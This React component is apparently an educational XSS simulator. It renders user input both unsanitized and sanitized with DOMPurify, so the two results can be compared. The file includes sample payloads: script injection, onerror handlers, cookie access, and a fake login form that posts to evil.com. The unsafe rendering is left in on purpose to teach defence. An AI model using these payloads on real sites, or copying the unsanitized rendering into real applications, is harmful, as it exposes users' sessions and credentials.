/**
 * XSS Attack Simulator Page — MAIN CYBERSECURITY FEATURE
 * 
 * This is the core educational feature of the project.
 * It demonstrates Cross-Site Scripting (XSS) attacks by showing:
 * 
 * Section A — VULNERABLE: Renders user input unsanitized (dangerous)
 * Section B — SECURE: Same input sanitized with DOMPurify (safe)
 * 
 * IMPORTANT: This is for EDUCATIONAL PURPOSES ONLY.
 * The vulnerable section uses dangerouslySetInnerHTML to demonstrate
 * how XSS attacks work. In real applications, NEVER do this!
 */

import { useState, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import DOMPurify from 'dompurify';
import { staggerContainer, staggerItem } from '../animations/variants';
import {
  HiCode, HiShieldCheck, HiShieldExclamation, HiExclamation,
  HiLightBulb, HiPlay, HiTrash, HiChevronDown, HiChevronUp
} from 'react-icons/hi';

const XSSSimulator = () => {
  const [userInput, setUserInput] = useState('');
  const [showExplanation, setShowExplanation] = useState(true);
  const [isTyping, setIsTyping] = useState(false);
  const inputRef = useRef(null);

  // Sample XSS attack payloads for demo
  const samplePayloads = [
    {
      label: 'Script Injection',
      payload: '<script>alert("XSS Attack!")</script>',
      description: 'Injects JavaScript that shows an alert box'
    },
    {
      label: 'Image Onerror',
      payload: '<img src="x" onerror="alert(\'Hacked!\')">',
      description: 'Uses broken image to trigger JavaScript'
    },
    {
      label: 'Styled Content',
      payload: '<h1 style="color:red;font-size:50px;">HACKED!</h1>',
      description: 'Injects styled HTML that changes page appearance'
    },
    {
      label: 'Cookie Steal',
      payload: '<img src="x" onerror="document.title=document.cookie">',
      description: 'Demonstrates how cookies could be stolen'
    },
    {
      label: 'Phishing Form',
      payload: '<form action="https://evil.com"><input placeholder="Enter password"><button style="background:red;color:white;padding:5px 10px;border:none;cursor:pointer">Login</button></form>',
      description: 'Injects a fake form to steal credentials'
    }
  ];

  // Typing animation effect for demo payloads
  const typePayload = (payload) => {
    setUserInput('');
    setIsTyping(true);
    let i = 0;
    const interval = setInterval(() => {
      if (i < payload.length) {
        setUserInput(payload.substring(0, i + 1));
        i++;
      } else {
        clearInterval(interval);
        setIsTyping(false);
      }
    }, 30);
  };

  return (
    <div className="max-w-6xl mx-auto px-4 sm:px-6">
      {/* Header */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="text-center mb-8 sm:mb-10"
      >
        <div className="inline-flex items-center gap-2 px-3 sm:px-4 py-2 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs sm:text-sm font-medium mb-4">
          <HiExclamation />
          Educational Purpose Only
        </div>
        <h1 className="text-2xl sm:text-3xl md:text-4xl font-bold text-white mb-3">
          XSS Attack <span className="bg-gradient-to-r from-red-400 to-orange-400 bg-clip-text text-transparent">Simulator</span>
        </h1>
        <p className="text-sm sm:text-base text-slate-400 max-w-2xl mx-auto px-2">
          See how Cross-Site Scripting (XSS) attacks work and learn how to prevent them.
          Compare vulnerable vs. secure rendering of user input.
        </p>
      </motion.div>

      {/* Input Section */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.2 }}
        className="mb-6 sm:mb-8 p-4 sm:p-6 rounded-2xl bg-[rgba(10,10,30,0.6)] border border-white/10"
      >
        <div className="flex items-center gap-2 mb-4">
          <HiCode className="text-xl text-cyan-400" />
          <h2 className="text-base sm:text-lg font-semibold text-white">Enter HTML/JavaScript Input</h2>
        </div>
        
        <textarea
          ref={inputRef}
          value={userInput}
          onChange={(e) => setUserInput(e.target.value)}
          placeholder="Try typing HTML/JS code here..."
          className="w-full h-28 sm:h-32 p-3 sm:p-4 rounded-xl bg-black/50 border border-white/10 text-cyan-300 font-mono text-xs sm:text-sm focus:border-cyan-500/50 focus:outline-none resize-none transition-all"
          spellCheck="false"
          id="xss-input"
        />

        {/* Quick Payload Buttons */}
        <div className="mt-3 sm:mt-4">
          <p className="text-xs text-slate-500 mb-2 sm:mb-3">Quick Attack Payloads:</p>
          <div className="flex flex-wrap gap-2">
            {samplePayloads.map((sample, index) => (
              <motion.button
                key={index}
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                onClick={() => typePayload(sample.payload)}
                disabled={isTyping}
                className="px-2.5 sm:px-3 py-1.5 rounded-lg text-[11px] sm:text-xs font-medium border border-white/10 text-slate-300 hover:border-red-500/30 hover:text-red-400 hover:bg-red-500/5 transition-all disabled:opacity-50"
              >
                <span className="flex items-center gap-1 sm:gap-1.5">
                  <HiPlay className="text-[10px]" />
                  {sample.label}
                </span>
              </motion.button>
            ))}
            <motion.button
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              onClick={() => setUserInput('')}
              className="px-2.5 sm:px-3 py-1.5 rounded-lg text-[11px] sm:text-xs font-medium border border-white/10 text-slate-400 hover:border-slate-500/30 hover:text-slate-300 transition-all"
            >
              <span className="flex items-center gap-1 sm:gap-1.5">
                <HiTrash />
                Clear
              </span>
            </motion.button>
          </div>
        </div>
      </motion.div>

      {/* Output Comparison */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 sm:gap-6 mb-6 sm:mb-8">
        {/* VULNERABLE Section */}
        <motion.div
          initial={{ opacity: 0, x: -20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.3 }}
          className="rounded-2xl overflow-hidden border border-red-500/20"
        >
          <div className="px-4 sm:px-6 py-3 sm:py-4 bg-red-500/10 border-b border-red-500/20 flex items-center gap-2">
            <HiShieldExclamation className="text-lg sm:text-xl text-red-400" />
            <h3 className="text-sm sm:text-base font-semibold text-red-400">⚠️ Vulnerable Output</h3>
            <span className="ml-auto badge badge-danger text-[10px] sm:text-xs">UNSAFE</span>
          </div>
          <div className="p-4 sm:p-6 bg-[rgba(10,10,30,0.6)] min-h-[150px] sm:min-h-[200px]">
            <p className="text-[10px] sm:text-xs text-slate-500 mb-3 font-mono">// Rendered with dangerouslySetInnerHTML (NEVER do this!)</p>
            {userInput ? (
              <div
                className="text-slate-300 break-all text-sm"
                dangerouslySetInnerHTML={{ __html: userInput }}
              />
            ) : (
              <p className="text-slate-600 italic text-xs sm:text-sm">Enter some HTML/JS above to see the vulnerable output...</p>
            )}
          </div>
        </motion.div>

        {/* SECURE Section */}
        <motion.div
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.3 }}
          className="rounded-2xl overflow-hidden border border-green-500/20"
        >
          <div className="px-4 sm:px-6 py-3 sm:py-4 bg-green-500/10 border-b border-green-500/20 flex items-center gap-2">
            <HiShieldCheck className="text-lg sm:text-xl text-green-400" />
            <h3 className="text-sm sm:text-base font-semibold text-green-400">✅ Secure Output</h3>
            <span className="ml-auto badge badge-success text-[10px] sm:text-xs">SAFE</span>
          </div>
          <div className="p-4 sm:p-6 bg-[rgba(10,10,30,0.6)] min-h-[150px] sm:min-h-[200px]">
            <p className="text-[10px] sm:text-xs text-slate-500 mb-3 font-mono">// Sanitized with DOMPurify before rendering</p>
            {userInput ? (
              <div
                className="text-slate-300 break-all text-sm"
                dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }}
              />
            ) : (
              <p className="text-slate-600 italic text-xs sm:text-sm">Enter some HTML/JS above to see the sanitized output...</p>
            )}
          </div>
        </motion.div>
      </div>

      {/* Raw Code Preview */}
      {userInput && (
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4 }}
          className="mb-6 sm:mb-8 p-4 sm:p-6 rounded-2xl bg-[rgba(10,10,30,0.6)] border border-white/10"
        >
          <h3 className="text-sm sm:text-base font-semibold text-white mb-4">🔍 Code Analysis</h3>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <p className="text-xs text-red-400 mb-2 font-semibold">Raw Input (What attacker sends):</p>
              <div className="code-block text-red-300 text-xs">{userInput}</div>
            </div>
            <div>
              <p className="text-xs text-green-400 mb-2 font-semibold">Sanitized Output (What DOMPurify produces):</p>
              <div className="code-block text-green-300 text-xs">{DOMPurify.sanitize(userInput) || '(empty - all malicious content removed)'}</div>
            </div>
          </div>
        </motion.div>
      )}

      {/* Explanation Panel */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.5 }}
        className="rounded-2xl bg-[rgba(10,10,30,0.6)] border border-white/10 overflow-hidden mb-8"
      >
        <button
          onClick={() => setShowExplanation(!showExplanation)}
          className="w-full px-4 sm:px-6 py-4 flex items-center justify-between hover:bg-white/5 transition-colors"
        >
          <h3 className="text-base sm:text-lg font-semibold text-white flex items-center gap-2">
            <HiLightBulb className="text-yellow-400" />
            Understanding XSS Attacks
          </h3>
          {showExplanation ? <HiChevronUp className="text-slate-400" /> : <HiChevronDown className="text-slate-400" />}
        </button>

        <AnimatePresence>
          {showExplanation && (
            <motion.div
              initial={{ height: 0, opacity: 0 }}
              animate={{ height: 'auto', opacity: 1 }}
              exit={{ height: 0, opacity: 0 }}
              transition={{ duration: 0.3 }}
              className="overflow-hidden"
            >
              <motion.div
                variants={staggerContainer}
                initial="initial"
                animate="animate"
                className="p-4 sm:p-6 pt-2 grid grid-cols-1 md:grid-cols-2 gap-4 sm:gap-6"
              >
                <motion.div variants={staggerItem} className="space-y-3 sm:space-y-4">
                  <div className="p-3 sm:p-4 rounded-xl bg-red-500/5 border border-red-500/10">
                    <h4 className="text-xs sm:text-sm font-semibold text-red-400 mb-2">🚨 What is XSS?</h4>
                    <p className="text-xs text-slate-300 leading-relaxed">
                      Cross-Site Scripting (XSS) is a security vulnerability where attackers inject 
                      malicious scripts into web pages viewed by other users. These scripts can steal 
                      cookies, session tokens, redirect users, or deface websites.
                    </p>
                  </div>
                  <div className="p-3 sm:p-4 rounded-xl bg-orange-500/5 border border-orange-500/10">
                    <h4 className="text-xs sm:text-sm font-semibold text-orange-400 mb-2">❓ Why Does XSS Happen?</h4>
                    <p className="text-xs text-slate-300 leading-relaxed">
                      XSS occurs when a website includes untrusted data (user input) in its output 
                      without proper validation or escaping. The browser cannot distinguish between 
                      legitimate scripts and injected malicious code.
                    </p>
                  </div>
                </motion.div>

                <motion.div variants={staggerItem} className="space-y-3 sm:space-y-4">
                  <div className="p-3 sm:p-4 rounded-xl bg-blue-500/5 border border-blue-500/10">
                    <h4 className="text-xs sm:text-sm font-semibold text-blue-400 mb-2">⚛️ How React Prevents XSS</h4>
                    <p className="text-xs text-slate-300 leading-relaxed">
                      React automatically escapes all values before rendering them in the DOM. 
                      When you use <code className="text-cyan-300">{'{variable}'}</code> in JSX, React treats it as text, 
                      not HTML. Only <code className="text-red-300">dangerouslySetInnerHTML</code> bypasses this.
                    </p>
                  </div>
                  <div className="p-3 sm:p-4 rounded-xl bg-green-500/5 border border-green-500/10">
                    <h4 className="text-xs sm:text-sm font-semibold text-green-400 mb-2">🛡️ How Sanitization Works</h4>
                    <p className="text-xs text-slate-300 leading-relaxed">
                      DOMPurify parses HTML input and removes all dangerous elements and attributes 
                      (like <code className="text-red-300">&lt;script&gt;</code>, <code className="text-red-300">onerror</code>). 
                      It keeps safe HTML while stripping anything that could execute JavaScript.
                    </p>
                  </div>
                </motion.div>
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>
      </motion.div>
    </div>
  );
};

export default XSSSimulator;
